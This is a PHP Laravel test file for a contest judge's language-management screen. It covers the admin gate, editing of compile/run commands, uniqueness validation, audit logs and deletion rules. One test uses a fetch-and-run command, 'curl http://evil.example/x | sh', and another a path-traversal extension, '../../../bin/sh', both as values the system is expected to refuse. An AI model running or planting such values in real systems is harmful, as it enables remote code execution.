<?php

namespace Tests\Feature\Backend;

use App\Models\Contest;
use App\Models\ContestLog;
use App\Models\Language;
use App\Models\Problem;
use App\Models\ProblemLanguageLimit;
use App\Models\Run;
use App\Models\Site;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Language management (issue #140).
 *
 * The screen edits `compile_command`/`run_command`, which become the shell
 * command line the judge executes -- so the gate, the audit trail and the
 * delete rule are the parts worth pinning down, not the happy path alone.
 */
class LanguageControllerTest extends TestCase
{
    use RefreshDatabase;

    /**
     * @return array<string, mixed>
     */
    private function payload(array $overrides = []): array
    {
        return array_merge([
            'name' => 'C++ (G++ 13)',
            'extension' => 'cpp_gpp13',
            'compile_command' => 'g++ -static -O2 -std=c++20 -o {output} {source}',
            'run_command' => './{executable}',
            'is_active' => '1',
        ], $overrides);
    }

    // ---------------------------------------------------------------
    // The admin gate. This screen is command entry executed by the
    // judge: a judge or a team reaching it is the failure that matters.
    // ---------------------------------------------------------------

    public function test_team_cannot_access_language_management()
    {
        $team = $this->createTestUser(['user_type' => 'team']);

        $this->actingAs($team)->get('/backend/languages')->assertStatus(403);
    }

    public function test_judge_cannot_access_language_management()
    {
        $judge = $this->createTestUser(['user_type' => 'judge']);

        $this->actingAs($judge)->get('/backend/languages')->assertStatus(403);
    }

    public function test_judge_cannot_create_a_language()
    {
        $judge = $this->createTestUser(['user_type' => 'judge']);
        $contest = Contest::factory()->create();

        $response = $this->actingAs($judge)->post('/backend/languages', $this->payload([
            'contest_id' => $contest->id,
        ]));

        $response->assertStatus(403);
        $this->assertDatabaseMissing('languages', ['extension' => 'cpp_gpp13']);
    }

    /**
     * The compile/run command is the payload an attacker would want to
     * change, so a non-admin must not be able to rewrite one on an existing
     * row either -- not just be blocked from creating new ones.
     */
    public function test_judge_cannot_edit_an_existing_languages_commands()
    {
        $judge = $this->createTestUser(['user_type' => 'judge']);
        $contest = Contest::factory()->create();
        $language = Language::factory()->create([
            'contest_id' => $contest->id,
            'compile_command' => 'gcc -o {output} {source}',
        ]);

        $response = $this->actingAs($judge)->put("/backend/languages/{$language->id}", $this->payload([
            'compile_command' => 'curl http://evil.example/x | sh',
        ]));

        $response->assertStatus(403);
        $this->assertSame('gcc -o {output} {source}', $language->fresh()->compile_command);
    }

    public function test_guest_is_redirected_to_login()
    {
        $this->get('/backend/languages')->assertRedirect('/login');
    }

    // ---------------------------------------------------------------
    // CRUD
    // ---------------------------------------------------------------

    public function test_admin_can_create_a_language()
    {
        $admin = $this->createAdminUser();
        $contest = Contest::factory()->create();

        $response = $this->actingAs($admin)->post('/backend/languages', $this->payload([
            'contest_id' => $contest->id,
        ]));

        $response->assertRedirect(route('backend.languages', ['contest_id' => $contest->id]));
        $response->assertSessionHasNoErrors();
        $this->assertDatabaseHas('languages', [
            'contest_id' => $contest->id,
            'name' => 'C++ (G++ 13)',
            'extension' => 'cpp_gpp13',
            'compile_command' => 'g++ -static -O2 -std=c++20 -o {output} {source}',
            'run_command' => './{executable}',
            'is_active' => true,
        ]);
    }

    public function test_admin_can_edit_the_compile_command()
    {
        $admin = $this->createAdminUser();
        $contest = Contest::factory()->create();
        $language = Language::factory()->create([
            'contest_id' => $contest->id,
            'name' => 'Java (OpenJDK 21)',
            'extension' => 'java21',
            'compile_command' => 'javac {source}',
            'run_command' => 'java -Xmx{memory}m {classname}',
        ]);

        $response = $this->actingAs($admin)->put("/backend/languages/{$language->id}", $this->payload([
            'name' => 'Java (OpenJDK 21)',
            'extension' => 'java21',
            'compile_command' => 'javac -encoding UTF-8 {source}',
            'run_command' => 'java -Xss64m -Xmx{memory}m {classname}',
        ]));

        $response->assertSessionHasNoErrors();
        $this->assertSame('javac -encoding UTF-8 {source}', $language->fresh()->compile_command);
        $this->assertSame('java -Xss64m -Xmx{memory}m {classname}', $language->fresh()->run_command);
    }

    public function test_index_lists_the_selected_contests_languages_only()
    {
        $admin = $this->createAdminUser();
        $contestA = Contest::factory()->create();
        $contestB = Contest::factory()->create();
        Language::factory()->create(['contest_id' => $contestA->id, 'name' => 'Linguagem Da Prova A', 'extension' => 'aaa']);
        Language::factory()->create(['contest_id' => $contestB->id, 'name' => 'Linguagem Da Prova B', 'extension' => 'bbb']);

        $response = $this->actingAs($admin)->get('/backend/languages?contest_id='.$contestA->id);

        $response->assertStatus(200);
        $response->assertSeeText('Linguagem Da Prova A');
        $response->assertDontSeeText('Linguagem Da Prova B');
    }

    /**
     * The placeholder list is the difference between an organiser writing a
     * working command and writing one that fails every submission. It must
     * come from what AutoJudgeService really substitutes -- including the
     * run-time-only ones that are easy to forget.
     */
    public function test_the_form_documents_the_placeholders_the_judge_substitutes()
    {
        $admin = $this->createAdminUser();
        Contest::factory()->create();

        $response = $this->actingAs($admin)->get('/backend/languages');

        foreach (['{source}', '{output}', '{basename}', '{judge_runtime}', '{executable}', '{classname}', '{memory}'] as $placeholder) {
            $response->assertSeeText($placeholder);
        }
    }

    // ---------------------------------------------------------------
    // Both UNIQUE indexes. Hitting either of these in the driver is a
    // 500; the point is that the administrator gets a message.
    // ---------------------------------------------------------------

    public function test_duplicate_extension_in_the_same_contest_is_rejected()
    {
        $admin = $this->createAdminUser();
        $contest = Contest::factory()->create();
        Language::factory()->create(['contest_id' => $contest->id, 'name' => 'C++ antigo', 'extension' => 'cpp_gpp13']);

        $response = $this->actingAs($admin)->post('/backend/languages', $this->payload([
            'contest_id' => $contest->id,
            'name' => 'C++ novo',
            'extension' => 'cpp_gpp13',
        ]));

        $response->assertSessionHasErrors('extension');
        $this->assertSame(1, Language::where('contest_id', $contest->id)->count());
    }

    public function test_duplicate_name_in_the_same_contest_is_rejected()
    {
        $admin = $this->createAdminUser();
        $contest = Contest::factory()->create();
        Language::factory()->create(['contest_id' => $contest->id, 'name' => 'C++ (G++ 13)', 'extension' => 'cpp_outro']);

        $response = $this->actingAs($admin)->post('/backend/languages', $this->payload([
            'contest_id' => $contest->id,
            'name' => 'C++ (G++ 13)',
            'extension' => 'cpp_gpp13',
        ]));

        $response->assertSessionHasErrors('name');
        $this->assertSame(1, Language::where('contest_id', $contest->id)->count());
    }

    /**
     * The indexes are scoped to the contest, and so is the rule: the same
     * language in a different edition is the normal case, not a conflict.
     */
    public function test_the_same_name_and_extension_are_allowed_in_another_contest()
    {
        $admin = $this->createAdminUser();
        $contestA = Contest::factory()->create();
        $contestB = Contest::factory()->create();
        Language::factory()->create(['contest_id' => $contestA->id, 'name' => 'C++ (G++ 13)', 'extension' => 'cpp_gpp13']);

        $response = $this->actingAs($admin)->post('/backend/languages', $this->payload([
            'contest_id' => $contestB->id,
        ]));

        $response->assertSessionHasNoErrors();
        $this->assertSame(1, Language::where('contest_id', $contestB->id)->count());
    }

    /**
     * Saving a language without touching its name/extension must not fail
     * against its own row.
     */
    public function test_editing_a_language_without_renaming_it_is_allowed()
    {
        $admin = $this->createAdminUser();
        $contest = Contest::factory()->create();
        $language = Language::factory()->create([
            'contest_id' => $contest->id,
            'name' => 'C++ (G++ 13)',
            'extension' => 'cpp_gpp13',
        ]);

        $response = $this->actingAs($admin)->put("/backend/languages/{$language->id}", $this->payload([
            'run_command' => './{executable} --fast',
        ]));

        $response->assertSessionHasNoErrors();
        $this->assertSame('./{executable} --fast', $language->fresh()->run_command);
    }

    /**
     * `extension` is interpolated into a filesystem path the judge executes
     * (Problem::getCompileScriptPath()), so it cannot be an arbitrary
     * string.
     */
    public function test_extension_with_path_separators_is_rejected()
    {
        $admin = $this->createAdminUser();
        $contest = Contest::factory()->create();

        $response = $this->actingAs($admin)->post('/backend/languages', $this->payload([
            'contest_id' => $contest->id,
            'extension' => '../../../bin/sh',
        ]));

        $response->assertSessionHasErrors('extension');
        $this->assertSame(0, Language::where('contest_id', $contest->id)->count());
    }

    // ---------------------------------------------------------------
    // The audit trail (issue #88)
    // ---------------------------------------------------------------

    public function test_editing_a_command_writes_a_contest_log_entry_with_the_old_and_new_value()
    {
        $admin = $this->createAdminUser();
        $contest = Contest::factory()->create();
        $language = Language::factory()->create([
            'contest_id' => $contest->id,
            'name' => 'Java (OpenJDK 21)',
            'extension' => 'java21',
            'compile_command' => 'javac {source}',
            'run_command' => 'java -Xmx{memory}m {classname}',
        ]);

        $this->actingAs($admin)->put("/backend/languages/{$language->id}", $this->payload([
            'name' => 'Java (OpenJDK 21)',
            'extension' => 'java21',
            'compile_command' => 'javac -encoding UTF-8 {source}',
            'run_command' => 'java -Xmx{memory}m {classname}',
        ]));

        $log = ContestLog::where('contest_id', $contest->id)->latest('id')->first();

        $this->assertNotNull($log);
        $this->assertSame($admin->user_id, $log->user_id);
        $this->assertStringContainsString('Java (OpenJDK 21)', $log->message);
        $this->assertStringContainsString('updated', $log->message);
        $this->assertStringContainsString($admin->username, $log->message);
        $this->assertSame('javac {source}', $log->context['changes']['compile_command']['from']);
        $this->assertSame('javac -encoding UTF-8 {source}', $log->context['changes']['compile_command']['to']);
        // Untouched fields stay out of the diff, so the entry stays readable.
        $this->assertArrayNotHasKey('run_command', $log->context['changes']);
    }

    public function test_creating_a_language_writes_a_contest_log_entry()
    {
        $admin = $this->createAdminUser();
        $contest = Contest::factory()->create();

        $this->actingAs($admin)->post('/backend/languages', $this->payload([
            'contest_id' => $contest->id,
        ]));

        $log = ContestLog::where('contest_id', $contest->id)->latest('id')->first();

        $this->assertNotNull($log);
        $this->assertStringContainsString('created', $log->message);
        $this->assertSame($admin->user_id, $log->user_id);
        $this->assertSame('g++ -static -O2 -std=c++20 -o {output} {source}', $log->context['compile_command']);
    }

    public function test_deleting_a_language_writes_a_contest_log_entry()
    {
        $admin = $this->createAdminUser();
        $contest = Contest::factory()->create();
        $language = Language::factory()->create(['contest_id' => $contest->id, 'extension' => 'zig']);

        $this->actingAs($admin)->delete("/backend/languages/{$language->id}");

        $log = ContestLog::where('contest_id', $contest->id)->latest('id')->first();

        $this->assertNotNull($log);
        $this->assertStringContainsString('deleted', $log->message);
        $this->assertSame($admin->user_id, $log->user_id);
    }

    // ---------------------------------------------------------------
    // The delete decision: refuse once anything was submitted in the
    // language, because runs.language_id is a cascadeOnDelete FK and a
    // soft delete would leave Run::language() resolving to null.
    // ---------------------------------------------------------------

    public function test_a_language_with_runs_cannot_be_deleted()
    {
        $admin = $this->createAdminUser();
        $contest = Contest::factory()->create();
        $site = Site::factory()->create(['contest_id' => $contest->id]);
        $team = $this->createTestUser(['user_type' => 'team', 'site_id' => $site->id]);
        $problem = Problem::factory()->create(['contest_id' => $contest->id]);
        $language = Language::factory()->create(['contest_id' => $contest->id, 'extension' => 'cpp_gpp13']);
        $run = Run::factory()->create([
            'contest_id' => $contest->id,
            'site_id' => $site->id,
            'user_id' => $team->user_id,
            'problem_id' => $problem->id,
            'language_id' => $language->id,
        ]);

        $response = $this->actingAs($admin)->delete("/backend/languages/{$language->id}");

        $response->assertSessionHas('error');
        $this->assertDatabaseHas('languages', ['id' => $language->id, 'deleted_at' => null]);
        // The submission -- and therefore the scoreboard -- is untouched.
        $this->assertDatabaseHas('runs', ['id' => $run->id, 'deleted_at' => null]);

        // And the screen offers no delete button for it in the first place,
        // rather than an action that is only going to be refused. The
        // delete form is the only one on this page that spoofs a method,
        // so its absence is what "no delete button" looks like in the HTML
        // (the edit form posts to the same URL, so the URL proves nothing).
        $index = $this->actingAs($admin)->get('/backend/languages?contest_id='.$contest->id);
        $index->assertStatus(200);
        $index->assertDontSee('value="DELETE"', false);
    }

    /**
     * A soft-deleted run still carries this language_id and can be
     * restored, so it blocks removal just like a live one.
     */
    public function test_a_language_whose_only_run_was_soft_deleted_still_cannot_be_deleted()
    {
        $admin = $this->createAdminUser();
        $contest = Contest::factory()->create();
        $site = Site::factory()->create(['contest_id' => $contest->id]);
        $team = $this->createTestUser(['user_type' => 'team', 'site_id' => $site->id]);
        $problem = Problem::factory()->create(['contest_id' => $contest->id]);
        $language = Language::factory()->create(['contest_id' => $contest->id, 'extension' => 'cpp_gpp13']);
        $run = Run::factory()->create([
            'contest_id' => $contest->id,
            'site_id' => $site->id,
            'user_id' => $team->user_id,
            'problem_id' => $problem->id,
            'language_id' => $language->id,
        ]);
        $run->delete();

        $response = $this->actingAs($admin)->delete("/backend/languages/{$language->id}");

        $response->assertSessionHas('error');
        $this->assertDatabaseHas('languages', ['id' => $language->id]);
    }

    /**
     * Deactivating is the supported way to retire a language that already
     * has submissions -- SubmitController refuses new runs in an inactive
     * language while the existing ones keep their commands and their place
     * on the scoreboard.
     */
    public function test_a_language_with_runs_can_still_be_deactivated()
    {
        $admin = $this->createAdminUser();
        $contest = Contest::factory()->create();
        $site = Site::factory()->create(['contest_id' => $contest->id]);
        $team = $this->createTestUser(['user_type' => 'team', 'site_id' => $site->id]);
        $problem = Problem::factory()->create(['contest_id' => $contest->id]);
        $language = Language::factory()->create([
            'contest_id' => $contest->id,
            'name' => 'Kotlin (2.4)',
            'extension' => 'kt',
            'is_active' => true,
        ]);
        Run::factory()->create([
            'contest_id' => $contest->id,
            'site_id' => $site->id,
            'user_id' => $team->user_id,
            'problem_id' => $problem->id,
            'language_id' => $language->id,
        ]);

        $response = $this->actingAs($admin)->put("/backend/languages/{$language->id}", [
            'name' => 'Kotlin (2.4)',
            'extension' => 'kt',
            'compile_command' => 'kotlinc {source} -include-runtime -d {output}.jar',
            'run_command' => 'java -jar {executable}.jar',
            // is_active omitted -- an unchecked checkbox sends nothing.
        ]);

        $response->assertSessionHasNoErrors();
        $this->assertFalse($language->fresh()->is_active);
    }

    /**
     * With no runs there is nothing to orphan, so the row goes for good
     * rather than being soft-deleted: a trashed row would keep occupying
     * the (contest_id, extension) UNIQUE index and make re-adding the same
     * extension fail against a row nobody can see any more.
     */
    public function test_a_language_with_no_runs_is_removed_and_its_extension_becomes_reusable()
    {
        $admin = $this->createAdminUser();
        $contest = Contest::factory()->create();
        $language = Language::factory()->create([
            'contest_id' => $contest->id,
            'name' => 'C++ (G++ 13)',
            'extension' => 'cpp_gpp13',
        ]);

        // With no runs the screen does offer the delete form.
        $this->actingAs($admin)->get('/backend/languages?contest_id='.$contest->id)
            ->assertSee('value="DELETE"', false);

        $this->actingAs($admin)->delete("/backend/languages/{$language->id}")->assertSessionHas('success');

        $this->assertDatabaseMissing('languages', ['id' => $language->id]);

        $response = $this->actingAs($admin)->post('/backend/languages', $this->payload([
            'contest_id' => $contest->id,
        ]));

        $response->assertSessionHasNoErrors();
        $this->assertDatabaseHas('languages', ['contest_id' => $contest->id, 'extension' => 'cpp_gpp13']);
    }

    /**
     * A per-problem limit override has no meaning without its language, so
     * the delete path removes it explicitly rather than trusting the
     * declared cascade -- SQLite never enables PRAGMA foreign_keys in this
     * suite, so a relied-on cascade would leave the rows behind here and
     * only work on MySQL. The confirm dialog on the screen says so.
     */
    public function test_removing_a_language_drops_its_per_problem_limit_overrides()
    {
        $admin = $this->createAdminUser();
        $contest = Contest::factory()->create();
        $problem = Problem::factory()->create(['contest_id' => $contest->id]);
        $language = Language::factory()->create(['contest_id' => $contest->id, 'extension' => 'cpp_gpp13']);
        $limit = ProblemLanguageLimit::create([
            'problem_id' => $problem->id,
            'language_id' => $language->id,
            'time_limit' => 5,
        ]);

        $this->actingAs($admin)->delete("/backend/languages/{$language->id}");

        $this->assertDatabaseMissing('problem_language_limits', ['id' => $limit->id]);
    }
}
